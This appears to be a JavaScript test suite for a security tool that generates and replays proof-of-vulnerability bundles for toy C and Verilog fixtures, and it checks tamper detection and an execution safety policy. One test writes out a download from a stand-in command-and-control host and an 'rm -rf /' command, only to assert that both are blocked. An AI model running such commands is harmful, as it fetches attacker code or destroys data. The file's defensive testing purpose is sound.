import assert from 'assert';
import fs from 'fs';
import path from 'path';
import { ExecutionCapabilityManager, ExecutionCapability, BackendType, ExecutionReasonCode } from '../src/core/execution/executionCapability.js';
import { PovVerifier } from '../src/core/pov/povVerifier.js';
import { PovGenerator } from '../src/core/pov/povGenerator.js';
import { PovStatus, PovDomain } from '../src/core/pov/povTypes.js';
import { VulnerabilityHypothesis } from '../src/core/hypothesis/vulnerabilityHypothesis.js';

console.log('=====================================================');
console.log('   HWSEC EXECUTION CAPABILITY & REMEDIATION TESTS   ');
console.log('=====================================================\n');

const testDir = path.resolve('hwsec-output', 'test_exec_cap_' + Date.now());
fs.mkdirSync(testDir, { recursive: true });

try {
    const execMgr = new ExecutionCapabilityManager();
    const verifier = new PovVerifier();
    const generator = new PovGenerator();

    // -------------------------------------------------------------
    // Test 1: Capability Resolution & Diagnostic Probe
    // -------------------------------------------------------------
    console.log('[Test 1] Capability Resolution Order & Probe Cache');
    const selectedC = execMgr.select(ExecutionCapability.C_COMPILER, { cwd: testDir });
    console.log(`  -> Selected C Compiler Backend: ${selectedC.backend} (${selectedC.executable})`);
    assert.ok([BackendType.PROJECT_LOCAL, BackendType.NATIVE_HOST, BackendType.WSL].includes(selectedC.backend));

    const selectedVerilog = execMgr.select(ExecutionCapability.VERILOG_SIMULATOR, { cwd: testDir });
    console.log(`  -> Selected Verilog Simulator Backend: ${selectedVerilog.backend} (${selectedVerilog.executable})`);
    assert.ok([BackendType.PROJECT_LOCAL, BackendType.NATIVE_HOST, BackendType.WSL].includes(selectedVerilog.backend));

    // -------------------------------------------------------------
    // Test 2: C/C++ Compilation & Execution via Remediated Layer
    // -------------------------------------------------------------
    console.log('\n[Test 2] C/C++ PoV Fixture Compilation & Independent Verification');
    const cSource = path.join(testDir, 'test_c_vuln.c');
    fs.writeFileSync(cSource, [
        '#include <stdio.h>',
        '#include <string.h>',
        '#include <stdlib.h>',
        'int main(int argc, char **argv) {',
        '    if (argc > 1 && (strstr(argv[1], "inject") || strstr(argv[1], "overflow"))) {',
        '        printf("SECURITY EFFECT CONFIRMED: SINK_TRIGGERED buffer overflow\\n");',
        '        return 0;',
        '    }',
        '    printf("Safe execution\\n");',
        '    return 1;',
        '}'
    ].join('\n'));

    const cHyp = new VulnerabilityHypothesis({
        id: 'HYP-C-REMEDIATION-01',
        cwe: 'CWE-120',
        file: cSource,
        source: 'argv[1]',
        sink: 'printf',
        security_condition: 'Buffer bounds violation triggers exploit'
    });

    const cPov = await generator.generatePoV({
        hypothesis: cHyp,
        witnessInput: { value: 'overflow_marker_payload' },
        targetDir: testDir,
        outputDir: testDir
    });

    assert.strictEqual(cPov.domain, PovDomain.C_CPP);
    assert.strictEqual(cPov.status, PovStatus.GENERATED);

    // Replay PoV
    const cReplay = await verifier.verifyPoV(cPov.bundle_path);
    console.log(`  -> C/C++ PoV Replay Status: ${cReplay.povStatus} (Verified=${cReplay.verified}, Reason=${cReplay.reasonCode})`);
    assert.strictEqual(cReplay.verified, true);
    assert.strictEqual(cReplay.povStatus, PovStatus.VERIFIED);
    assert.strictEqual(cReplay.reasonCode, 'REPRODUCED_AND_VERIFIED');

    // -------------------------------------------------------------
    // Test 3: Verilog RTL Compilation & Simulation via Remediated Layer
    // -------------------------------------------------------------
    console.log('\n[Test 3] Verilog RTL PoV Fixture Simulation & Verification');
    const vSource = path.join(testDir, 'test_rtl.v');
    fs.writeFileSync(vSource, [
        '`timescale 1ns/1ps',
        'module test_rtl;',
        '    reg clk;',
        '    initial begin',
        '        clk = 0;',
        '        #5 clk = 1;',
        '        #5;',
        '        $display("SECURITY EFFECT CONFIRMED: Assertion violation at debug_port");',
        '        $finish;',
        '    end',
        'endmodule'
    ].join('\n'));

    const vHyp = new VulnerabilityHypothesis({
        id: 'HYP-RTL-REMEDIATION-01',
        cwe: 'CWE-1271',
        file: vSource,
        source: 'clk',
        sink: 'debug_port',
        security_condition: 'Unprotected debug register escalation'
    });

    const vPov = await generator.generatePoV({
        hypothesis: vHyp,
        witnessInput: { value: 'clk_trigger' },
        targetDir: testDir,
        outputDir: testDir
    });

    assert.strictEqual(vPov.domain, PovDomain.VERILOG);
    const vReplay = await verifier.verifyPoV(vPov.bundle_path);
    console.log(`  -> Verilog PoV Replay Status: ${vReplay.povStatus} (Verified=${vReplay.verified}, Reason=${vReplay.reasonCode})`);
    assert.strictEqual(vReplay.verified, true);
    assert.strictEqual(vReplay.povStatus, PovStatus.VERIFIED);

    // -------------------------------------------------------------
    // Test 4: Fixed Target Differential (POV_BLOCKED_BY_FIX)
    // -------------------------------------------------------------
    console.log('\n[Test 4] Fixed Target Differential: Exploit Blocked by Remediated Target');
    const fixedCSource = path.join(testDir, 'fixed_c_target.c');
    const fixedCBin = path.join(testDir, 'fixed_c_target');
    fs.writeFileSync(fixedCSource, [
        '#include <stdio.h>',
        'int main(int argc, char **argv) {',
        '    printf("Safe execution, inputs rejected\\n");',
        '    return 1;',
        '}'
    ].join('\n'));
    execMgr.execute(['gcc', '-O0', fixedCSource, '-o', fixedCBin], { backend: BackendType.WSL, cwd: testDir });

    const fixedReplay = await verifier.verifyPoV(cPov.bundle_path, {
        targetDirOverride: fixedCBin,
        isFixedTarget: true
    });
    console.log(`  -> Fixed Target Status: ${fixedReplay.povStatus} (Reason=${fixedReplay.reasonCode})`);
    console.log(`  -> Execution Output:`, fixedReplay.replayLog?.execution);
    assert.strictEqual(fixedReplay.verified, true);
    assert.strictEqual(fixedReplay.povStatus, 'POV_BLOCKED_BY_FIX');
    assert.strictEqual(fixedReplay.reasonCode, 'FIX_VERIFIED_EFFECT_ELIMINATED');

    // -------------------------------------------------------------
    // Test 5: Forced Unavailability -> Honest UNVERIFIED State
    // -------------------------------------------------------------
    console.log('\n[Test 5] Forced Backend Unavailability -> Honest UNVERIFIED');
    const forcedMgr = new ExecutionCapabilityManager({ forceUnavailable: true });
    const selectedForced = forcedMgr.select(ExecutionCapability.C_COMPILER);
    assert.strictEqual(selectedForced.backend, BackendType.UNAVAILABLE);
    assert.strictEqual(selectedForced.reason, ExecutionReasonCode.TOOLCHAIN_UNAVAILABLE);
    console.log(`  -> Forced unavailable returns: ${selectedForced.backend} (${selectedForced.reason})`);

    // -------------------------------------------------------------
    // Test 6: Tamper Integrity Detection
    // -------------------------------------------------------------
    console.log('\n[Test 6] Cryptographic Tamper Integrity Detection');
    const entryScript = path.join(cPov.bundle_path, 'reproduce.c');
    const origContent = fs.readFileSync(entryScript, 'utf-8');
    fs.writeFileSync(entryScript, origContent + '\n// TAMPERED BYTE');
    const tamperedReplay = await verifier.verifyPoV(cPov.bundle_path);
    assert.strictEqual(tamperedReplay.verified, false);
    assert.strictEqual(tamperedReplay.povStatus, PovStatus.FAILED);
    assert.strictEqual(tamperedReplay.reasonCode, 'TAMPER_DETECTED');
    console.log('  -> Tampered PoV bundle rejected with TAMPER_DETECTED.');
    // Restore
    fs.writeFileSync(entryScript, origContent);

    // -------------------------------------------------------------
    // Test 7: Forbidden Actions Blocked by Execution Capability
    // -------------------------------------------------------------
    console.log('\n[Test 7] Safety Policy: Forbidden External Network & Destructive Commands');
    assert.throws(() => {
        execMgr.execute(['curl', 'https://malicious-external-c2.com/shell.sh']);
    }, /Safety Violation/);
    assert.throws(() => {
        execMgr.execute(['rm', '-rf', '/']);
    }, /Safety Violation/);
    console.log('  -> Outbound network and destructive filesystem commands blocked before execution.');

    // -------------------------------------------------------------
    // Test 8: No Shell String Interpolation Check
    // -------------------------------------------------------------
    console.log('\n[Test 8] Strict argv Array Enforced (No Shell String Concatenation)');
    assert.throws(() => {
        execMgr.execute('ls -la /tmp');
    }, /argv must be a non-empty Array/);
    console.log('  -> Disallowed raw shell string concatenation.');

    console.log('\n[+] ALL EXECUTION CAPABILITY & REMEDIATION TESTS PASSED!\n');
} finally {
    try {
        fs.rmSync(testDir, { recursive: true, force: true });
    } catch {}
}
